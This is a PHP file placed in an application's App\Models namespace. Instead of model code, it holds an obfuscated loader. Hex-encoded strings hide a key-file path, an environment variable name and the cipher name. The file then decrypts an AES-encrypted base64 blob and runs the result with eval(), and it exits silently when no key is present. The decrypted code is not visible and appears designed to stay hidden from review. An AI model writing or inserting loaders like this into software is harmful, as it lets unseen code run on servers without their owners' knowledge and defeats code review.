<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('A8vnYBflciybT52d4wzG7A==');

$c=base64_decode(

'BpCUg6OzTKgJC/3YdKX+HMbIhMPO3ETYHd3O7jyEwDhn/zI/Olr98my657YPO9goCea44Tp+E9qb' .
'E22rldv7zWJt0p/D0BQNCP1XzsuGP5FKE4r+9x7Mx9M3zF1Itg8kQJdGTJJjsd1xPII4RJCcPf90' .
'vB5xCo7vmYoDA0nff+nAXXLUyit/Ug+biLhoZFqtVpxO72qYYEg+20FDzNFHAgSxnroCqUJcbzsh' .
'4p+JbKOQ2kPmkgdlIbQLDAFqnXrWCo9yJ9xVRRmRgrybfIsP0tFkzowlGxLsCMF0J26MAL+bfJUo' .
'JVqWEtTgYThtc/kM+VjjgMVCK1jejuhmG3cmQnA4AEmYDT8Bh3ZJjrarvf8CUnZBIABxT+MmImII' .
'Iie43DFIIXKFF2KQ4p9Jc3gYB89q3lC1s4wClSFeoWxXH4w2r40Ja7Qnz9VguPloaQTC+9Uema7V' .
'rbQNsPQKYfV4sRD37sRwjBM4O5Ave4IQ8GoafynKXyfndoxl+C7l8wQnp/ZVbxF3yO7/Trci0aHO' .
'uxv0hTT5ka2L4ZPx2RSFnf9MU5aDmJZe+UMA+8vuhlf5Vn42fWVc60L/OFTxcm5G1IwsBPA3I67x' .
'RXBZ7tWlzzY7U7kTv57jPilZDPKfPPcFwRsjHazY3agYyzTpkoNLeSgvij6l7TN3N22qYpaYwSfK' .
'hwoisCC8BxY07KP4CypdrvU2Dr6hNXU+5mLyoMgOg2btnhDLJz8+sq8BGZKL32esBJYZ79fcoKGP' .
'odPJ0geFh7qxYYA6lhG0R1K5NNZAWmiWbd6xun9LxWGVGXSiFDTqWzMEKTEpG1EJCKcf0ehGcQTz' .
'0Z1dyrAezfCv5Tfl2icFtnsKCxEbcCMA/7grgDC8aumDH2Ljh71WTYQ3WS3l'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

